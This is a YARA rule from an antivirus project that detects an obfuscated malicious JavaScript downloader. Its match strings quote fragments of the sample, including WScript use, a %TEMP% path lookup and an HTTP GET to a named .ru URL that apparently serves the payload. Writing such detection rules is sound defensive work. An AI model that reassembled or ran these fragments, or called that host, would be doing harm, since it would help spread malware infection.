rule sig_20160428_272e81af53343d5da8f4e55655c205fb {
  meta:
    description = "datamaliciousorder - file 20160428_272e81af53343d5da8f4e55655c205fb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2623b32e6e55b9a3c3bcacb14f12faf5ee64ff0050f1d2927a124854878e456d"

  strings:
    $s1  = "function BbeYzfRklJycUkiWahXvk(FhoXbqBxkVutIqdUtsMix){DgnOzzBcyWyiUamIoqSgw[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function BbeYzfRklJycUkiWahXvk(FhoXbqBxkVutIqdUtsMix){DgnOzzBcyWyiUamIoqSgw[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function LnqJbyUwyNvuHgoXunYpr() {return DgnOzzBcyWyiUamIoqSgw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function SjcVnyVmhBsbAonNdvGwr(FsgBrmEhcUxaRruIrgUlg, SpbMgbGxyRqnDbfBfaNyb){QaoNukGhzZncOyePagPts = QaoNukGhzZncOyePagPts * 1; " ascii
    $s5  = "var DgnOzzBcyWyiUamIoqSgw = function EbpNnpVjjUsiLhcXtxGye() {return XslQneNbnEfuRxgTczAed[AnjWajRqfAceCvkOwtAcu](\"WScript\"+\"" ascii
    $s6  = "return FsgBrmEhcUxaRruIrgUlg - SpbMgbGxyRqnDbfBfaNyb;};" fullword ascii
    $s7  = "VylOynCwsWvaVbfBaqSmf[YnrVrqYarPrdJfpWzvVuw](\"G\" + \"ET\", \"http://banketcentr.ru/v8usja\", false);" fullword ascii
    $s8  = "var DgnOzzBcyWyiUamIoqSgw = function EbpNnpVjjUsiLhcXtxGye() {return XslQneNbnEfuRxgTczAed[AnjWajRqfAceCvkOwtAcu](\"WScript\"+\"" ascii
    $s9  = "var XslQneNbnEfuRxgTczAed = this[\"WScript\"];" fullword ascii
    $s10 = "function LnqJbyUwyNvuHgoXunYpr() {return DgnOzzBcyWyiUamIoqSgw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (VylOynCwsWvaVbfBaqSmf[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function SjcVnyVmhBsbAonNdvGwr(FsgBrmEhcUxaRruIrgUlg, SpbMgbGxyRqnDbfBfaNyb){QaoNukGhzZncOyePagPts = QaoNukGhzZncOyePagPts * 1; " ascii
    $s13 = "function DyyMshVnrRcyGhnTaoYli(){return AcbZwlPhxBweExuBbjOoh + \"\";};" fullword ascii
    $s14 = "function CudRndFhxWbtAiiWeaIag() {return ((BbzOexRsgCgjZsxRtoYpn == true) && (BbzOexRsgCgjZsxRtoYpn == IcnHmlEktVpmKtgMqsMln)) ?" ascii
    $s15 = "function CudRndFhxWbtAiiWeaIag() {return ((BbzOexRsgCgjZsxRtoYpn == true) && (BbzOexRsgCgjZsxRtoYpn == IcnHmlEktVpmKtgMqsMln)) ?" ascii
    $s16 = "}while (ZxxAjjHgeKauRdnMozEkl);" fullword ascii
    $s17 = "var IcnHmlEktVpmKtgMqsMln = false;" fullword ascii
    $s18 = "return SjcVnyVmhBsbAonNdvGwr(1 == 1 ? SuhOsrYghTlvAuvAtfLpf : 0, 1 == 1 ? PpbQrsEhbGxsVnnVltMug : 0);" fullword ascii
    $s19 = "var YghAziAjrWttSzoRwgYqv = false;" fullword ascii
    $s20 = "function XinDclBodExxGljJzeJqb(RelCciYtwVfsDfzMdsBbx) {var IsbMflEvcGylXuxNjoBal = (1, 2, 3, 4, 5, RelCciYtwVfsDfzMdsBbx); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}